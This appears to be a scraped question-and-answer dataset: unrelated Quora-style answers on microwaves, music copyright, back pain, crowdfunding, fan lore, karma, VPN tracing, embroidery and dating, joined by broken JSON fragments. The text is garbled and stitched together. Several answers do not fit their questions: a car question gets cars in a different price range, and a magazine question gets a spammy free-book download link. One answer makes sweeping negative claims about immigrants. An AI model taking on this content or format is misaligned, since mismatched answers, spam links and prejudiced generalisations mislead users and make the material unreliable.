However, some people are hesitant to use them due to concerns about potential health risks associated with microwave-cooked food. Here's a breakdown of some common myths and facts surrounding microwaved food and your health: 1. Myth: Microwaving food destroys nutrients. Fact: Microwaving food is actually one of the best cooking methods for retaining nutrients. Because microwaving cooks food quickly and at a low temperature, fewer nutrients are lost during the cooking process compared to other methods. 2. Myth: Microwaving plastic containers can release harmful chemicals into your food. Fact: While some plastics can release harmful chemicals when heated, most microwave-safe containers are made of materials that won't leach chemicals into your food. To be safe, always use containers labeled as microwave-safe, and avoid using containers that are cracked or damaged. 3. Myth: Microwaved food can cause cancer. Fact: There is no scientific evidence to support this claim. Microwave radiation is a type of non-ionizing radiation that doesn't have enough energy to damage your DNA or cause cancer. 4. Myth: Microwaving food can create harmful radiation. Fact: Microwaves are a type of electromagnetic radiation, but they are non-ionizing and cannot cause cancer or other harmful effects. Additionally, microwaves are only produced when the microwave oven is turned on and stop immediately when the oven is turned off. In summary, microwaving food is generally safe and can actually be a healthy cooking option. As with any cooking method, it's important to use safe containers and follow best practices to avoid potential risks. You Can also Develop your Cooking through more Recipes.

However, don’t make the rookie mistake of assuming that because those compositions can be played by anyone without having to pay anyone anything, that therefore recordings of those compositions are also in the public domain. Recordings are different. If you want to use a recording of a work by a composer from that era, you have to find out if the recording is in the public domain. Chances are, it won’t be. This means that you will have to pay for the rights to use the recording. If you don’t want to do that, you can of course record musicians playing that music. But you’d better pay them, and sort out the rights in the recording that you make of them playing it. Unless, that is, you can play it yourself, from the sheet music, in which case the rights are between you the producer and you the performer. Then again, some texts of the music of these composers may not be in the public domain. It then depends on what edition you’re using. This is not usually a problem with most works, because the differences between one text and another will likely be inaudible to most listeners. But the main point is this: the actual music of composers from the eras of Bach, Beethoven, Mozart, etc. is in the public domain. But that doesn’t mean you can use any recording of it for free. If you find this situation confusing, say so in the comments and further enlightenment will be provided."},{"instruction":"What are the most beautiful gardens in the world?","output":"There are many breathtaking gardens around the world that are considered to be among the most beautiful.

Why or why not?","output":"When “reality” is talked about, yes, it is dualistic! The very reason that “reality” exists is because of duality or existence of remoteness, take it away and you have no reality. Ask yourself this: “If you were not able to observe something (anything) external to you, would you know that you exist?” The instant an “I” exists, the remote “you or her or he or she or it” also exists. It is a pair that occurs together or not at all! Without a remoteness, “I” cannot be recognised or exist. “I” always exists in relation to something else. That is the “Parabrahma tattvam” or “the concept of remote creation”. Take away that “remote” from all your thoughts and try to think of something, you will find there is no thoughts that can occur! The instant you think “I am this body” which seems totally non-dualistic, you find it is not true. You have duality even in this statement.

These tools contribute to improved financial asset performance by increasing engagement and transparency, fostering collaboration, and fostering increased engagement and transparency. Financial advisors may use digital wealth management to build seamless client experiences across all devices and platforms, allowing them to scale solutions to reach a larger number of customers. High-touch consulting has always been an important component of the advisor-client relationship; however, in the digital era, clients need financial advisers to quickly learn about their requirements, preferences, and objectives to deliver personalized financial advice. The financial services industry's digitization allows companies to share data-driven insights with advisers, encouraging engagement and strengthening partnerships. When it comes to leveraging digital technologies to communicate with clients, wealth management organizations encounter a shared set of issues, many of which are related to data collection. Most businesses' client contacts are defined by a large amount of data that is often fragmented and dispersed throughout the organization. It's also more difficult to give tailored insights and relevant services due to a lack of third-party data (on spending and saving habits, values, and interests, as well as related transactional data). Data-driven insights and the ability to engage in cross-channel strategic messaging are two benefits of connecting businesses with automated marketing tools and technologies. Fintech companies are providing new capabilities and techniques to empower technology and expertise to improve customer engagement and corporate performance. The primary drivers of digital change in wealth management are listed below: Switch to digital: According to numerous surveys, 40% of modern investors desire digital access to their accounts, and 80% prefer to manage their investments and contact advisors using mobile applications.Costs and fee pressure: Transparency about fees and compensation puts downward pressure on fees, but the massive assault of regulatory requirements drives up expenses in the traditional business model.Competition: Digital wealth management firms are challenging the traditional wealth management model by providing more personalized and efficient digital experiences that align with shifting customer expectations.Technology: Through mobile interaction, analytics, and service delivery, technology allows innovative capabilities. It provides a consistent context for interactions across channels that may be automated, as well as enhanced access to data sources that are otherwise inaccessible to make routine process decisions."},{"instruction":"Should Rs 3,000 crore be spent to build Ram Mandir?","output":"Some facts: Ayodhya temple is being built using donations collected from devotees, not taxpayers' funds.

Lesley Manville and Tracey Ullman Lesley Manville and Tracey Ullman both attended the Italia Conti Academy of Theatre Arts as school pupils (so not exactly drama school; despite the school acting as a drama school). There is a two year age difference between the two so both will have encountered each other and started their careers in West End theatre in the 1970s together at about the same time. They also appeared in the 1981 Royal Court Theatre production of Rita Sue and Bob Too which was later turned into a film Rita, Sue and Bob Too (1986) directed by the late Alan Clarke — that Manville also starred in.

You're not alone. I understand the frustration and discomfort it can cause, and I'm here to provide some tips that can help you find relief and get back to enjoying life pain-free. Living with back pain can be incredibly challenging, but there are steps you can take to alleviate your discomfort and regain control over your well-being. Let's explore some effective approaches: Take care of your posture: Poor posture can contribute to back pain and hinder your progress toward recovery. By improving your posture, you can alleviate strain on your back and promote overall spinal health. Be mindful of your posture when sitting, standing, and lifting. Keep your spine aligned, and shoulders relaxed, and avoid slouching. Consider incorporating ergonomic adjustments into your daily activities, such as using a supportive chair or adjusting your workstation setup.Engage in targeted exercises and physical therapy: Exercise is a powerful tool for managing lower back pain. Engaging in targeted exercises and physical therapy can work wonders in strengthening the muscles supporting your spine, improving flexibility, and reducing pain.Discover the therapeutic benefits of heat or cold therapy: Applying heat or cold packs to your back can provide soothing relief and help alleviate discomfort. Experiment with both options to see which works best for you. Heat therapy, such as using a heating pad or taking a warm bath, can help relax muscles and increase blood flow to the area. Cold therapy, like using ice packs or cold compresses, can reduce inflammation and numb the area. Listen to your body and choose the option that brings you the most relief. Remember to use a barrier (such as a towel) between the heat or cold pack and your skin to prevent burns or frostbite.Prioritize relaxation and stress management: Stress and tension often exacerbate back pain. It's essential to prioritize relaxation and stress management techniques in your daily routine. Explore relaxation techniques such as deep breathing exercises, mindfulness meditation, and progressive muscle relaxation. These practices can help you unwind, reduce muscle tension, and promote overall well-being. Additionally, consider incorporating gentle stretching exercises, such as yoga or tai chi, into your routine to improve flexibility and release muscle tension.Enhance your sleep for optimal healing: Restful sleep is crucial for your body's healing process. Make sure you prioritize sleep and optimize your sleep environment. Choose a supportive mattress and pillow that align with your comfort needs. Avoid sleeping on your stomach as it can strain your back. Instead, sleep on your back or side with a pillow between your knees for added support. Establish a bedtime routine that promotes relaxation, such as avoiding electronic devices before bed, creating a calm sleep environment, and practicing good sleep hygiene habits. You'll wake up refreshed and ready to tackle the day without the burden of back pain.Achieve holistic wellness through lifestyle adjustments: Your overall well-being plays a significant role in managing back pain. By adopting a healthy lifestyle, you can support your back and improve your overall quality of life. Consider these lifestyle adjustments: Balanced diet: Eat a nutritious diet rich in fruits, vegetables, whole grains, lean proteins, and healthy fats. Adequate nutrition supports the body's healing processes and promotes overall health. Regular exercise: In addition to targeted exercises for your back, engage in regular physical activity to strengthen your overall body. Choose activities you enjoy, such as walking, swimming, or cycling, to improve cardiovascular health and promote overall well-being. Stress reduction practices: Chronic stress can contribute to back pain. Incorporate stress reduction practices into your daily routine, such as meditation, deep breathing exercises, or engaging in activities that bring you joy and relaxation.Maintain a healthy weight: Excess weight puts additional strain on your back and can worsen back pain. Maintain a healthy weight through a combination of regular exercise and a balanced diet.Avoid smoking: Smoking can impair blood flow and decrease the body's ability to heal, which may contribute to back pain. Quitting smoking can improve overall health and aid in the management of back pain. In addition to these strategies, certain supplements may help support your efforts in managing lower back pain. Omega-3 fatty acids: Found in fish oil and certain plant-based sources, omega-3 fatty acids have anti-inflammatory properties that may help reduce inflammation and alleviate pain in the lower back.Turmeric: Turmeric contains a compound called curcumin, which has been studied for its anti-inflammatory and analgesic properties. It may help reduce inflammation and provide relief from lower back pain.Vitamin D: Low levels of vitamin D have been associated with an increased risk of musculoskeletal pain, including lower back pain. Getting adequate sunlight exposure and consuming vitamin D-rich foods may be beneficial. In some cases, healthcare professionals may recommend vitamin D supplementation to address deficiencies.Magnesium: Magnesium plays a vital role in muscle relaxation and may help alleviate muscle spasms associated with lower back pain. Adequate magnesium levels can be maintained through a balanced diet that includes foods like nuts, seeds, leafy greens, and whole grains. In cases of deficiency, magnesium supplements may be considered under professional guidance.I think all these tips will help you with your lower back pain.

I see anecdotal arguments, hypothetical arguments, but those aren’t valid. To be a valid argument, it should be rational, logical, and backed up by raw data.

Only the reformed souls are resurrected to jannah / paradise , the rest keep coming back to this planet , in the form of rebirth, for reformation. Our next lives on this planet will be made heaven - like if we follow God's laws, do a lot of good deeds in this life , stay away from bad deeds .

As with any research oriented assignment, I would say starting as early as possible is there best thing to do. Don't waste time to start identifying potential sources. If you don't really have a topic, that process needs to get done quick. You don't have to boil the topic or area down to a specific title yet, just have a general direction and start getting some reading done. As you read and collect information and data, always be thinking ahead. Be considering your next question. Research is intended to answer questions — particularly new questions. What we really want to do is to get to the right questions because the right questions give us the right answers. Sometimes you'll have to sift through some wrong questions, but that's okay. As long as your philosophy is founded in looking and thinking ahead, you'll likely come up with a direction quickly to get a new question. As a side note, don't get too worried if results or data weren't what you expected. Scientific truth is found whether an experiment succeeds or fails. Failure teaches us what doesn't work and that is every bit as important to the scientific process as finding what does work. Try to have a good time with it. You will likely get very tired of the topic and primary research question as you progress. I know a person that did some incredible research on the medicinal and antimicrobial properties of honey. A year's of extremely solid and diligent work. She wouldn't even hardly eat honey at the end. 😂 Just try your best to keep in perspective what you enjoy about the topic and learning. Only thing to follow up off that last point is to make sure you take good breaks from your work. Make sure you take time off. Give yourself your weekends. It's hard to do. But, when you are leaving on a Friday that was crazy and gave you ridiculous results or data, remind yourself that the data will be there for you on Monday to figure out. It's okay to not think about your research now and that will make you a better researcher in the long run."},{"instruction":"Which is the best car in India under Rs 5 lakh in 2020?","output":"Here are some of the best cars under 10 lakhs in India: Maruti Suzuki Brezza: The Brezza is a popular choice for buyers looking for a stylish and affordable SUV.

I think there is a lot of truth to it. If you ask me, I think if you don’t do the repairs yourself, you should at least know what was broken and what it takes to get things back in order. In America, not everything is license required. Knowing what’s involve and costs for the repair usually helps to determine whether you should DIY or call for help. If you are in a habit of just calling for contractors, the maintenance costs could eaten you alive and there goes the budget. Number one trouble calls you will get are plumbing related. Drains clogged, leaks, faucet(s) not operating, water heater not functioning… You will find that most drains clogged were hair, hair, and hair. Buy a bunch of drain screens from the 99 cent store and give it to the tenant, that would save you a lot of unnecessary frustrating calls. Also Harbor Freight Tools or Amazon, this cheap drain snake gadget comes in handy. [LINKED_TEXT: 7 Pack Drain Snake, Kungix Drain Clog Remover Clogged Drain Hair Remover Zipit Drain Cleaning Tool - - Amazon.com] [URL: https://www.amazon.com/Drain-Kungix-Remover-Clogged-Cleaning/dp/B07FTDS3CJ/ref=sr_1_2_sspa?ie=UTF8&qid=1549294764&sr=8-2-spons&keywords=drain%20clog%20remover&psc=1] Most leaks were just things got loose. Learned the wonders of Teflon tape and how to tighten things with pipe wrench would do magics. Faucets are easy to replace providing you are not afraid to get under the sink. I have replaced many water heaters myself because of the high costs of labor and it’s not that hard. That’s the one chore you need help because of the weight f the water heater. I was a teacher before I came to the US and know nothing about repairing things. In Vietnam, Hong Kong, or Thailand. In fact, pretty much all over Asia, people rely on tradesman and specialists when things breakdown. However, in the USA, I learned and found out I can do everything myself. My ex and I often said Home Depot and Lowes were the most romantic places for all who believes in DIY (Do It Yourself). Want to be self reliant, America is the place. Youtube is your best teacher where you can even learn how to build a house let alone just minor repairs. Most of the time, I found that I can do a much better job than people who claimed to be professionals. There are too many unscrupulous contractors out there whose main goal was to gouge or prey on people who can’t assess the extend of the repairs. Being a property manager for 30 rental properties, troubles are always looming no matter what day it is. Also as a realtor, I got in a habit of doing many minor repairs for my seller(s) or to make buyer(s) happy when both sides are not budging on repair items. Labor is expensive in America, average plumber with charge you 75 per hour plus parts. Electricians the same. So there goes a hundred dollars for every call. There is not a one size fits all for all situations. Finding an honest and good contractor is like finding a needle in a haystack. If you found one, treasure him/her. Know thy limits and call for the experts. Don’t get mad when SHIT happens. It’s life. Ask the tenant to shoot you a video. Then go online to find answers and go check out the problem before calling anybody. That’s what I do. You will find out so much about yourself and what you are capable of doing. I used to do everything myself before I hit 65, now i’m very selective of what I want to do.

The women's hairstyle look more close to beehive, a style which only popularized in the 60′s. WWII women are styled in curls and rolls and are generally short and are kept due to the type of work available to women that time — fields, factories, and armed forces. The second woman from the bottom has a Brownie Hawkeye camera which was only manufactured by 1949 — 4 years after the war. So what is the picture about?

I have been in Qatar for a while now. It’s quite the opposite here! Almost all the government offices, public service units/company and other government-affiliated entities start their official working hours from 7–7:30 o’clock in the morning. I also have 7:30 am - 4 pm shift timing. There is a substantial number of people who actually wake up way earlier in the morning around the Fajr Prayer time and start their day very early. Nobody sleeps here in the morning, man. Even many shops open up between 5–7 am while others around 8–9 am. Same work culture and routine is there in the UAE, Kuwait & Bahrain (I have some friends, relatives and acquaintances over there, so I can tell). It might be slightly different in Oman and Saudi Arabia though but not very significant. Now, people who are super rich or who don’t have their work routine like teenagers or school/college goers, they might be sleeping late in the morning or till afternoon, just like in any other part of the world. So, it’s really about the social strata and the age group they belong to. I hope this answers your query. Thank you!"},{"instruction":"Where do you find the crowd for crowdfunding campaigns?","output":"You can find the crowd in many places. But that’s part of the problem. I bet you could sit down for 5 minutes and list out 20 different possible places you could find backers for your campaign. But trying to market to 20 different sources is not an efficient use of your time. You need to prioritize where you will be most effective. To do this, let’s break down the top sources of traffic to highly funded Kickstarter & Indiegogo campaigns. For fun, I’ll also throw in some other traffic sources that can also be effective. TOP 4 SOURCES Let’s start with the top 4 sources to highly funded campaigns. For fun, I like to call these the Four Horseman of Crowdfunding. The First Horseman: Pre-Launch Community You build your Pre-Launch Community before your campaign launches. It is a list of people that are interested in purchasing your product once your campaign launches. There are many different ways to build a Pre-Launch Email List, but my favorite is through Facebook Advertising. This Horseman leads the charge. On average, we find that around 90% of the sales from the Pre-Launch Email List will come within the first 48 hours. The goal of the Pre-Launch Email List is to drive sales immediately to your campaign once you launch. Ideally, the traffic from this Horseman alone will be enough to get your campaign funded. Learn more about Facebook Advertising and email marketing [LINKED_TEXT: here] [URL: https://learn.launchboom.com/hacking-kickstarter-2-0-24cebb74f281]. The Second Horseman: Facebook Advertising Facebook’s targeting is scary good. So good that other platforms (Google, Twitter, etc.) haven’t even come close to the same return as we’ve seen on Facebook. This is why we tend to spend 100% of our ad budgets on Facebook. Instagram may creep in there sometimes, but it’s owned by Facebook so it still counts as “Facebook Advertising” in my book. This Horseman will fight till the end. The Facebook Advertising Horseman will be with you for the remainder of the campaign after the Pre-Launch Email List has ridden off. Facebook Ads allow you to keep sustained traffic throughout your campaign. Depending on how good the returns are, you can scale up and down as you please. If you are able, I recommend using an agency like [LINKED_TEXT: Jellop] [URL: https://jellopcrowdfunding.com/] during the campaign. The Third Horseman: PR & Media Placement Landing solid PR provides your campaign with two things: (1) Credibility — everyone loves to see the “logo clouds” and quotes from top media. (2) Sales — top tier media placement can put millions of eyeballs on your product which can drive tons of pledges. BaKblade 2.0 got picked up by Business Insider in the last week of the campaign and raised nearly 200K in 4 days. The original video that went viral received 30 million views (yes million), 56 thousand likes, 179,115 shares, and 131 thousand comments! This Horseman fights in waves. Most of the time, the traffic you receive from PR will come in bursts. You’ll get placement on some media site, see a spike in traffic and sales and then see it die down just as fast. Good news is that PR tends to become easier to land with each successful story you get. Some of my favorite agencies to work with are [LINKED_TEXT: Proper Propaganda] [URL: http://properpropaganda.net/] and [LINKED_TEXT: PulpPR] [URL: https://pulppr.com/]. The Fourth Horseman: Kickstarter/Indiegogo’s Community I get the question all the time: “why do you launch on Kickstarter or Indiegogo? Shouldn’t you just launch on your own website so you have more control?” There are many reasons why crowdfunding platforms are the best place to launch your product, but the top reason has never changed — crowdfunding platforms have millions of visitors viewing their website every day. Tap into that traffic and you’ll raise a lot more money. This Horseman never rides alone. If the other three Horsemen don’t show up to the campaign, then this Horseman won’t appear either. Drive sales through your Pre-Launch Email List, Facebook Advertising, and PR and you’ll start to see sales come in from Kickstarter or Indiegogo’s communities. The reason why is because both of the platforms have a ranking system. Generally, the more popular your campaign is, the higher you are in the rankings. Cool fact: Last time I calculated the percentage of sales from Kickstarter across all our campaigns the number came out to 28.3%. That’s a lot of sales! OTHER MARKETING STRATEGIES Here are some other marketing strategies that I’ve seen also seen get more backers. Kickbooster These guys created the first affiliate program for Kickstarter and it’s worked pretty well for us. With it, you can incentivize your backers to share your project by giving them a % of the sales they drive. [LINKED_TEXT: Kickbooster] [URL: https://kickbooster.me/] also has something called their Superbooster network where big news publications like Mashable and Gizmodo will write a story about your product and get paid a portion of the sales they drive. The Gadget Flow Evan and his team have done a great job building this service to give exposure to Kickstarter campaigns. Check out their pricing and see if one of their options would work for you. Cross Promotions Cross promotions are when you reach out to other Kickstarter campaigns that are currently live and offer to promote their campaign. In return, they’ll promote your campaign to their backers. It’s much better to be methodical about your outreach. You’ll want to choose campaigns that: You genuinely think your backers will likeHave similar demographics & interestsHave similar backer counts (don’t reach out to a campaign with 10,000 backers when you have 100. It’s not a fair trade) The usual way to cross promote is to include a link to their campaign in one of your campaign updates and they’ll do the same. Indiegogo InDemand Now we’re getting into post-campaign territory but it’s important to know this is an option. After the campaign is over, you can launch directly onto Indiegogo InDemand. You can think of it as a pre-order store. They will copy your campaign from Kickstarter over instantly and you’ll be up and running in 10 minutes. BackerKit This is also another post-campaign strategy. BackerKit not only makes shipping & fulfillment a breeze, but they also have an extremely effective upsell tool which has always made us money. If you are extra nice, they may even feature you in their newsletter during your campaign. Just reach out early and see if they can help you. — Good luck, -Mark [LINKED_TEXT: Click here] [URL: https://www.quora.com/profile/Mark-Pecota] for my most popular Quora answers about Kickstarter, Indiegogo, and entrepreneurship"},{"instruction":"Did a landlord ever offer to lower your rent so that you wouldn't leave?","output":"Our landlord did just this to keep us. We had been in the house for a couple of lease cycles and we had never been late on the rent, kept the place up nicely, cut down a buckthorn forest and we got along with the neighbors on both sides.

We had checked other rentals in the area and were planning to move to a place about 300 month less and mentioned that to the landlords. The landlords then offered us a lease at that same rate for one year only.

I took some liberties with the lore (I’ve also only seen the show). HOUSE CLEYE, VASSALS OF HOUSE STARK LOCATED BETWEEN THE NECK AND CAPE KRAKEN The Cleyes have a long but poorly documented history. They have long been fiercely independent, but at the same time swear fealty to the Starks in Winterfell, if only because they see themselves more as Northerners than anything else, and living under the Starks was one of the few ways to protect against encroaching crannogmen and ironborn - their location between the Neck and Cape Kraken ensured that there was no shortage of enemies to the east or west. Their family sigil is a badger, a fierce, independent creature born of the earth, standing rampant upon a shield split in half with red on the bottom and brown on top; the red resembles both blood shed in defense of their lands and the clay that gives them their name and their lives, while the brown represents their earthen walls. They are based out of the castle of Marshall Keep, named after one of their oldest descendants, Marshall Cleye, who fought against the Targaryen invasion, but stood down once the Starks surrendered. Since then, the Cleyes have been tasked with the challenge of keeping watch in several directions for ironborn incursions and invading armies. It is often said that “the Cleyes can’t stop them, but they’ll sure as hell make them work”. This is in reference to the massive fortifications, at least by (man-made) Northern standards, that the Cleyes are fond of building and maintaining. These are huge constructions of clay and stone from which the original Cleyes got their name; their mixed nature ensures that they are reasonably strong while also easy to repair. The best known of their fortifications is Dodger’s Wall, sometimes (both sarcastically and sincerely, depending on who you talk to) called the Great Wall, standing forty feet high in some places and stretching from the western edge of the Neck, all along the southern coast, wrapping back around to almost totally encircle Cleye lands, with several less imposing branches shooting off into Cape Kraken and the Neck. The wall is dotted with numerous castles and towers, but only a handful are actually manned at all times. Rather than sit idly behind their walls and wait out an enemy, the Cleyes use their fortifications as part of an active offense-defense strategy in which they bait and exhaust their enemies, often encircling the foe (with men usually, but in one infamous battle against the ironborn, with an actual hastily constructed wall). However, being made of earth and stone as they are, these walls won’t stop a serious invader for more than a day or two, even shorter for attackers that already have constructed siege engines with them. It could be argued, though, that the walls still serve their purpose perfectly - the Cleyes understand that they aren’t the Lannisters or the Starks, and that they can’t hope to defend their land for long against large forces, and so they make it their mission to be as much of an infuriating nuisance to the enemy as physically possible. The clay that gives the Cleyes their name also extends to the family’s personal philosophy. Like the clay, they are flexible and can be molded to any situation, changing their strategies and doctrines to suit the current situation. However, when crisis and war inevitably come to their doorstep, the fire does not drive them back or harm them - it hardens their resolve and makes them stronger. This concept gives them their motto, “The Crucible’s Bane”. (I had a really hard time coming up with a good motto - if you have a suggestion, go for it.) In the War of the Five Kings, the Cleyes were staunch supporters of the King in the North, and later frustrated the ironborn invaders that ravaged the North, and then led a not-so-discrete resistance against House Bolton. The Boltons, of course, recognized this insurrection, but given the isolated nature of House Cleye, both diplomatically and physically, they determined that it was not worth marching a force through the Neck and against Cleye walls; the Cleyes’ particular brand of frustration was only effective when armies were marching against the North, not from it."},{"instruction":"What are some of the best actual images of real atoms and molecules?","output":"Depends what you mean by ‘see’.

Why or why not?","output":"Well …. actually I don't. Why …………because, we human beings have brains and we are good at logic and justification, and when we ourselves, get convinced with that justification, we believe in that. Though I am a Hindu by belief and I know the story of how Dhritrashta, in one of his previous births had poked thorns in the eyes of birds and that was the reason, he was born blind in his birth as Dhritrashta. The story goes like this that on some occasion he asks Lord Krishna the reason for his blindness and Krishna through his mystical powers shows him his previous births, where in he pokes thorns in the eyes of newly born birds. I used to believe in Karma a lot but off late I have started believing that it it doesn't exist. Again mind Lol…I will give you reasons:- Everyone's life is full of ups and downs. There is no person on this earth who has seen only ups or only downs. So when we face downs in life, we try to find a logic and because we keep hearing the law of karma, we immediately try to justify ourselves that we might have done something wrong, somewhere that is why ,we are facing this.Most of the time , when people do something wrong ( as such there is nothing write or wrong but while doing something if you feel guilty then it is wrong for you), and immediately after that something wrong happens to them, they feel it's because of their karma. They feel that because they did this wrong, this has happened to them.Two incidents are actually independent of each other and we try to correlate them. For example : if I deduct my maids salary for she being absent for ten days and suddenly after that my washing machine stops working,it needs a repair and has an expense of RS.4000/- ,I start feeling that because I deducted her pay, I have to pay it somewhere else. Here the point to be noted is , do I have a guilt while deducting my maids pay, if yes then I think it is because of karma. But if I do something in my righteousness and consciousness, I will never have that guilt, no matter what happens after that or how much ever big a loss I bear, I will never feel that it is because of karma. Because I have done it in complete righteousness. Here me deducting my maid's salary and my machine becoming nonfunctional are two incidents, independent of each other.I myself have come across people, when they pay heavy price for their karma , because people act in pattern. For example : There is a manager and he is good entangling people in some or the other wrong deeds and firing them. And he is quite successful at it. But one day, he would definitely come across one such subordinate, who would retort so badly and vehemently that the manager would really pay heavy in terms of his respect and reputation. So when people continuously do something in repeated pattern,that is harming people, someone or the other is going to retort. And I won't call it as karma. Because as per my understanding, law of karma is very subtle. So then what is Karma, it is very subtle that you won't even understand if it works or not. We have various philosophies that explain the law of karma. But I as a normal human being refuse to believe in the law of karma. For if something doesn't happen as per my liking in my life, I would blame it on the law of karma Lol. That I might have done something wrong in some of my previous births and it is because of that I am facing this. I have seen people who have cheated me upfront and coming back to me after years and crying and asking for forgiveness and also requesting me not to curse them and their family. Reason I am sharing this is, they knew in the core of their hearts that they are wrong, they were cheating me and they were guilty. I have already mentioned that if you are guilty, that is one justification for karma. BTW, I never cursed them and just moved ahead the in life. As for me, I have seen a lot of hardships in my life, and I believe in taking charge of them and moving ahead. Because believing in law of karma weakens my belief in myself, I do not want to believe that because I have done something wrong, I am facing this. I basically do not want to believe in any philosophy which weakens my belief in my self. That is the crux."},{"instruction":"becoming a doctor financially worth it?","output":"Yes, it is!

As a melting pot, Canadians consisting of a mixture of many nationalities who, while maintaining their own cultures to some extent thereby enriching the social fabric of Canada, fully embraced the Canadian values forged over its early years resulting in a society where everybody was welcome and accepted and shared the special things that made their original cultures unique. This resulted in an overall reputation of Canadians being friendly, accepting, tolerant and generally polite. In recent years, however, the multicultural ideology that Justin Trudeau’s father started has developed into a strategy where the original immigrants from Europe and Asia have been replaced by third world countries without the effort to integrate them within the culture resulting in enclaves in the larger cities comprised of people with little to no knowledge of Canadian history or established values. Consequently, they are raising families lacking the understanding that the rest of us share in common. Some of these are bordering on hostile to what the previous “polite” generations held dear. So the question remains - will the fragmentation of the Canadian fabric continue, thereby making us a nation at war with itself or will there come some transformational leader on to the scene that will redirect us back to the once “polite” society the world once held in high esteem ?"},{"instruction":"What's it like to have a 150 IQ?

It’s just that some family are functioning healthier compared to others but this will not help your situation. Never compare yourself about anything to anyone.

If you are in the USA, either the Embroidery Guild of America or The American Needlepoint Guild would be great places to start. Many other countries have great guilds too, Canada, Australia, and the UK all have something equivalent. Since I am in the USA any information I give you is specific to the US but I am sure other organizations are similar. Membership is inexpensive, my chapter was 55 in 2017 and sometimes they will sponsor you the first year and membership into a group like this comes with a number of fantastic benefits. First off, you get to be around people who enjoy the same past time that you do. So much of stitching is handed down through generations and being in a group gets you access to tips and tricks that other peoples grandparents showed them. The camaraderie is amazing. I owe so much to the women of my chapter. They don't just encourage me to be a better stitcher. When I was unemployed they helped me find the perfect job. Helped me prep for the interview and shared in my joy when I got it. Secondly, you get access to crazy amounts of free patterns and education materials. There is a quarterly magazine, correspondence courses and even discounts at local craft stores. This year I have had the opportunity to attend two conventions, two retreats, and countless one day classes. Every single one day class I took was put on by my local chapter and was free or close to it. To be fair I did have to pay for the conventions and retreats but, all of them came with classes and kits taught by world class teachers. Third, you get exposed to lots of different types of stitching. When I started I did only American or English style embroidery. 6 years after joining a guild I have had exposure to Cross Stitch Samplers, Beading, Japanse Silk Embroidery, Italian Needle Lace, Casaguidi, Hapsburg Lace, Needle painting, Hardanger, Needlepoint on painted canvas and on counted canvas, Shashiko, and many more. All in guild sponsored one or two day classes that were either free or just the cost of supplies. Finally, you finish way more projects. This does not mean you have less stash or fewer unfinished objects (UFO’s). It just means that when you are working on a group project you are more likely to finish it. Its kind of like having a work out buddy. When other people are invested in what you are working on you are more likely to have help when you need it and more desire to show it off at show and tell. ***EDIT*** I just noticed that the original poster was in the UK. Did you know that the Royal School of Embroidery is in London? It is the only place in the world you can get a degree in stitching. They also have a fantastic museum.

I know of several engineers who went the entrepreneurial way and took risk, created businesses, jobs for many and wealth for themselves.

I am sure most students do not have entrepreneurial ambitions when they start engineering school, and certainly not their parents.

Here are some of the methods that can be used to trace a VPN connection: IP address tracking: The IP address assigned to a device by a VPN provider can be used to determine the general location of the device, but it can be difficult to determine the specific identity of the person using the VPN connection. However, it's worth noting that some VPN providers keep logs of the IP addresses assigned to their users, which can be used to trace a VPN connection.Traffic analysis: The traffic generated by a VPN connection can be analyzed to determine the source and destination of the data being transmitted. This can be done by analyzing the characteristics of the data, such as the type and volume of traffic, and cross-referencing it with other information.Malicious software: Malicious software, such as malware or spyware, can be used to monitor and collect information about a VPN connection, including the source and destination of the data being transmitted.Cooperation with ISPs and other organizations: Tracing a VPN connection may also require the cooperation of internet service providers (ISPs) and other organizations, such as law enforcement agencies, that have access to additional information and technical resources. It's worth noting that while VPN connections can be traced, they offer a higher level of privacy and security compared to using the internet without a VPN. However, to ensure the highest level of privacy and security, it's important to choose a reputable and trustworthy VPN provider that has a strong privacy policy and does not keep logs of user activity."},{"instruction":"w can I download magazines for free on the Internet?","output":"Download the book for free: It Ends with Us [LINKED_TEXT: Open Now] [URL: https://www.yasinzone.com/2023/08/download-book-for-free-it-ends-with-us.html]"},{"instruction":"any way?","output":"Prajakta Kohli who achieved a lot during her a short span of career with all her self-confidence.

Pick the right first date spot. When you’re planning a first date, you don’t want to go somewhere too fancy or too loud or someplace you can’t have a conversation (like a movie). The point of a first date is to see how well you connect with each other , so talking and enjoying each other’s company are important here. Your best bet in choosing a first date spot is to go somewhere lighthearted and relaxed. You don’t want to deal with the pressure of a formal restaurant or the chaos of an amusement park for your first meeting. Think sitting down at a coffee shop or grabbing a drink somewhere casual where you can get the conversation going. And if it feels like you and your date are hitting it off, you can take it up a notch by going to dinner that night or suggesting a meetup the next morning for a walk or smoothie date. 2. Date safely. Safety should always be your priority—especially in the online dating scene. It’s so important for both guys and ladies to date with caution. We don’t want to scare you, but remember—you don’t really know the person you’re going out with. To be safe on a first date, meet in a public place where other people can see you. Tell a friend where you’re going and what time you expect to be home. You could even share your location with them so they can check in and see where you are if they haven’t heard from you by a certain time. And unless you already know the person you’re going on a date with really well, don’t share super personal information like your home or work address. We repeat: Do not share your address! Once you establish trust, you can let them pick you up or drop you off at your house. But in the early days, a stranger doesn’t need to know where you live. 3. Dress for confidence and comfort. Okay, we’re going to lighten the mood a bit by answering a really important question: What should you wear on a first date? Well, choosing an outfit you feel comfortable in is always a good idea. But to make a good first impression, you should also put some time and effort into looking nice. Think about the atmosphere and dress code of your first date spot. Ladies, it might not be appropriate to wear those stiletto heels to a coffee date at Starbucks, but flats are always a classic. And gentlemen, swap your sweatpants for a nice pair of jeans and an ironed shirt (and add a blazer if you want to look really snazzy). 4. Relax on your date. Does love feel like a battlefield? Maybe you feel lonely on the inside because you’re still single and don’t want to be, or maybe you have a huge crush on someone and really want it to turn into something more. Just take a deep breath and relax for a moment. Here’s a nugget of wisdom for you: The purpose of a first date isn’t to decide if you want to marry this person—it’s to decide if you want to go on a second date. That’s it! So, try to have fun, and enjoy spending time with and getting to know another human. If you click, that’s great. And if you aren’t feeling it, don’t force it. It’s not the end of the world. The old saying is true . . . there are plenty of other fish in the sea. 5. Give thoughtful compliments. Both guys and girls really appreciate a thoughtful compliment if it’s genuine. Telling your date, “Wow, you look great,” is totally appropriate. But giving too many compliments throughout the date, though, can be a little awkward. So, if you’re worried about coming on too strong, just compliment your date on something other than their appearance—like their laugh, sense of humor, intelligence or great taste in music. 6. Ask good questions. Before your date, come up with a few questions ahead of time so you don’t struggle to think of a conversation starter while you’re sitting across from someone you’ve just met. Instead of the usual get-to-know-you questions (do you really want to explain why blue is your favorite color again?), here are some creative ideas that will help you get to know your date on a deeper level: What’s the last book you read, and what did you think of it?What’s your favorite gift you’ve ever received?What’s something you’ve never tried but always wanted to?What’s your favorite 